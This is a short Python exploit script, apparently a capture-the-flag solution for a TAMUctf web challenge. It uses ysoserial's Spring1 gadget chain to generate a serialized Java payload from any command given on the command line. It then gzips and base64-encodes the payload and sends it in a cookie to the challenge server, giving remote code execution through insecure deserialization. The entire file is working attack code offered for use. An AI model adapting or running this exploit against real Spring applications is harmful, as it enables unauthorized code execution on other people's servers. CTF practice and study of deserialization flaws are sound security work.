import gzip
import base64
import requests
import os
import sys
import time

payload_file = "payload-spring1.bin"
url = "http://toomanycredits.tamuctf.com/"
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);",
   "Referer": "http://toomanycredits.tamuctf.com/"
}

command = sys.argv[1]

payload = "{}".format(command)
print("[*] Creating payload: {}".format(payload))
os.remove(payload_file)
os.popen("java -jar ./ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar Spring1 \"{}\" > {}".format(payload, payload_file))
time.sleep(5)

with open(payload_file, "rb") as f:
    malicious_payload = f.read()

print("[*] Malicious payload is: {}".format(malicious_payload))

compressed_malicious_bytes = gzip.compress(malicious_payload)
print("[*] Compressed malicious bytes are: {}".format(compressed_malicious_bytes))

base64_compressed_malicious_payload = base64.b64encode(compressed_malicious_bytes).decode("ascii")
print("[*] Base64 compressed malicious string is: {}".format(base64_compressed_malicious_payload))

print("[*] Sending request.")
cookies = dict(counter="\"{}\"".format(base64_compressed_malicious_payload))
page = requests.get(url, headers=headers, cookies=cookies)

print("[*] Response received:\n\n{}".format(page.text))
